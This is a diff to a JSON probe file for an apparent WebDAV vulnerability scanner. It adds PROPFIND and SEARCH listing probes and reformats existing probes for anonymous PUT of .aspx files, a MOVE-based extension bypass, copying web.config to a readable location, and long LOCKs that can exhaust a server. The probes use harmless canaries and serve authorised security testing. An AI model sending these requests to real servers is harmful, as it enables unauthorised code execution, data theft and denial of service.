@@ -4,16 +4,37 @@
   "contexts": {
     "options_dav_header": {
       "description": "Server advertises DAV class via DAV: 1,2,3 header in OPTIONS response. Confirms WebDAV stack is loaded even if specific routes are unreachable.",
-      "tech_match": ["iis", "apache", "nginx", "tomcat", "lighttpd"],
+      "tech_match": [
+        "iis",
+        "apache",
+        "nginx",
+        "tomcat",
+        "lighttpd"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "OPTIONS / HTTP/1.1",
           "description": "Read DAV class. DAV: 1 = basic; DAV: 2 = locks; DAV: 3 = bind/orderedcollections (rare).",
           "matchers": [
-            {"type": "status", "status": [200, 204], "condition": "or"},
-            {"type": "header", "header": "dav", "weight": 80},
-            {"type": "header", "header": "ms-author-via", "weight": 60}
+            {
+              "type": "status",
+              "status": [
+                200,
+                204
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "header",
+              "header": "dav",
+              "weight": 80
+            },
+            {
+              "type": "header",
+              "header": "ms-author-via",
+              "weight": 60
+            }
           ],
           "severity": "low",
           "confidence_boost": 30,
@@ -23,15 +44,32 @@
     },
     "propfind_directory_listing": {
       "description": "PROPFIND returns XML inventory of resources under given path — bypass for directory listings disabled via mod_autoindex/IIS settings. Default Depth: infinity walks entire tree.",
-      "tech_match": ["dav", "webdav"],
+      "tech_match": [
+        "dav",
+        "webdav"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "PROPFIND / HTTP/1.1\\r\\nDepth: 1",
           "description": "Single-level listing — succeeds even when GET to / returns 403 or index.html",
           "matchers": [
-            {"type": "status", "status": [207], "condition": "and"},
-            {"type": "word", "words": ["<D:multistatus", "<D:response", "<D:href"], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                207
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "words": [
+                "<D:multistatus",
+                "<D:response",
+                "<D:href"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 70,
@@ -41,8 +79,20 @@
           "payload": "PROPFIND / HTTP/1.1\\r\\nDepth: infinity",
           "description": "Full-tree walk — often disabled by config but works on default IIS WebDAV + many SharePoint",
           "matchers": [
-            {"type": "status", "status": [207], "condition": "and"},
-            {"type": "word", "words": ["<D:multistatus"], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                207
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "words": [
+                "<D:multistatus"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 75,
@@ -52,14 +102,25 @@
     },
     "put_arbitrary_file": {
       "description": "Anonymous PUT writes attacker file under web-root. Combined with executable extension (.aspx/.jsp/.php) = RCE.",
-      "tech_match": ["dav", "iis", "apache"],
+      "tech_match": [
+        "dav",
+        "iis",
+        "apache"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "PUT /swk-dav-{{marker}}.txt HTTP/1.1\\r\\nContent-Length: 4\\r\\n\\r\\nswk",
           "description": "Write a harmless canary file. 201/204 = anonymous PUT enabled. Follow with GET to confirm.",
           "matchers": [
-            {"type": "status", "status": [201, 204], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                201,
+                204
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 85,
@@ -69,7 +130,14 @@
           "payload": "PUT /swk-dav-{{marker}}.aspx HTTP/1.1\\r\\nContent-Type: text/asp\\r\\nContent-Length: <N>\\r\\n\\r\\n<%@ Page %><%=1%>",
           "description": "PUT an .aspx/.jsp/.php → if GET returns 200 with executed output, RCE confirmed. Use a benign math expression payload (Rule 5).",
           "matchers": [
-            {"type": "status", "status": [201, 204], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                201,
+                204
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 90,
@@ -79,14 +147,22 @@
     },
     "mkcol_create_collection": {
       "description": "MKCOL creates new collection (directory) under target path. Common precursor to PUT — some servers allow MKCOL but block PUT at root.",
-      "tech_match": ["dav"],
+      "tech_match": [
+        "dav"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "MKCOL /swk-mkcol-{{marker}}/ HTTP/1.1",
           "description": "Anonymous MKCOL creates writable dir",
           "matchers": [
-            {"type": "status", "status": [201], "condition": "and"}
+            {
+              "type": "status",
+              "status": [
+                201
+              ],
+              "condition": "and"
+            }
           ],
           "severity": "high",
           "confidence_boost": 70,
@@ -96,14 +172,24 @@
     },
     "copy_move_to_extension": {
       "description": "Restrictive web server allows .txt PUT but blocks .aspx PUT. COPY/MOVE smuggles a .txt-written file into an executable extension. IIS 6 'Microsoft Windows 2003 WebDAV' bypass uses this pattern.",
-      "tech_match": ["iis", "windows"],
+      "tech_match": [
+        "iis",
+        "windows"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "MOVE /swk-dav-{{marker}}.txt HTTP/1.1\\r\\nDestination: /swk-dav-{{marker}}.aspx",
           "description": "Rename uploaded .txt to .aspx — bypasses extension filter applied only at PUT",
           "matchers": [
-            {"type": "status", "status": [201, 204], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                201,
+                204
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 85,
@@ -113,7 +199,14 @@
           "payload": "COPY /web.config HTTP/1.1\\r\\nDestination: /swk-stolen-{{marker}}.txt",
           "description": "Copy a protected config file into web-served location for reading. IIS 6 / 7.x classic.",
           "matchers": [
-            {"type": "status", "status": [201, 204], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                201,
+                204
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 85,
@@ -123,15 +216,30 @@
     },
     "lock_token_exhaustion": {
       "description": "LOCK without UNLOCK / lock-timeout misconfig — repeatedly acquire locks against same resource until server exhausts lock store. DoS-class; only test against authorised lab targets (Rule 5 boundary case).",
-      "tech_match": ["dav"],
+      "tech_match": [
+        "dav"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "LOCK /index.html HTTP/1.1\\r\\nTimeout: Second-604800\\r\\n\\r\\n<D:lockinfo>...</D:lockinfo>",
           "description": "Acquire 7-day lock on a resource. Single LOCK is informational; loops over many resources = DoS (do NOT run that without explicit Rule 5 waiver).",
           "matchers": [
-            {"type": "status", "status": [200], "condition": "and"},
-            {"type": "word", "words": ["<D:locktoken", "<D:owner"], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                200
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "words": [
+                "<D:locktoken",
+                "<D:owner"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "medium",
           "confidence_boost": 50,
@@ -141,15 +249,30 @@
     },
     "sharepoint_webdav_quirks": {
       "description": "SharePoint exposes WebDAV under /_layouts/15/owssvr.dll and /personal/<user>/. PROPFIND there can expose internal SharePoint URLs + workflow tokens.",
-      "tech_match": ["sharepoint"],
+      "tech_match": [
+        "sharepoint"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "PROPFIND /personal/ HTTP/1.1\\r\\nDepth: 1",
           "description": "SharePoint personal site PROPFIND — discloses every user with a personal site (PII)",
           "matchers": [
-            {"type": "status", "status": [207], "condition": "and"},
-            {"type": "word", "words": ["personal", "OWSSITE"], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                207
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "words": [
+                "personal",
+                "OWSSITE"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 70,
@@ -159,18 +282,128 @@
     },
     "iis_short_filename_8_3": {
       "description": "IIS 8.3 short-filename disclosure via WebDAV-tunneled GET/OPTIONS. ~1 / ~2 wildcards leak first 6 chars of any filename in directory even when listing disabled.",
-      "tech_match": ["iis", "windows"],
+      "tech_match": [
+        "iis",
+        "windows"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "/*~1*/",
           "description": "Short-filename probe. 404 vs 400 differential reveals existing files. Combine with binary-search to enumerate full names.",
           "matchers": [
-            {"type": "status", "status": [404, 400, 200], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                404,
+                400,
+                200
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "medium",
           "confidence_boost": 50,
           "variables": {}
+        }
+      ]
+    },
+    "propfind_unauth_listing": {
+      "description": "WebDAV PROPFIND returns directory listing without auth. Internal-IP href leaks expose private network topology.",
+      "tech_match": [
+        "DAV"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "PROPFIND / Depth: 1 — 207 Multi-Status + multistatus body confirms listing",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                207
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "<D:multistatus",
+                "<D:href"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {
+            "method": "PROPFIND",
+            "header_inject": {
+              "Depth": "1"
+            },
+            "manual_chain": true
+          }
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "PROPFIND leaks internal-IP hrefs — RFC1918 in response body",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                207
+              ]
+            },
+            {
+              "type": "regex",
+              "pattern": "<D:href>https?://(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {
+            "method": "PROPFIND",
+            "header_inject": {
+              "Depth": "1"
+            },
+            "manual_chain": true
+          }
+        }
+      ]
+    },
+    "search_method_listing": {
+      "description": "WebDAV SEARCH verb returns IIS/MSSQL-backed file listing via searchrequest XML.",
+      "tech_match": [
+        "IIS",
+        "Microsoft-HTTPAPI"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "<?xml version='1.0'?><D:searchrequest xmlns:D='DAV:'><D:sql>SELECT \"DAV:displayname\" FROM \"/\"</D:sql></D:searchrequest>",
+          "description": "SEARCH / with SQL-like search request — 207 multistatus on success",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                207
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "multistatus"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 50,
+          "variables": {
+            "method": "SEARCH",
+            "content_type": "application/xml",
+            "manual_chain": true
+          }
         }
       ]
     }
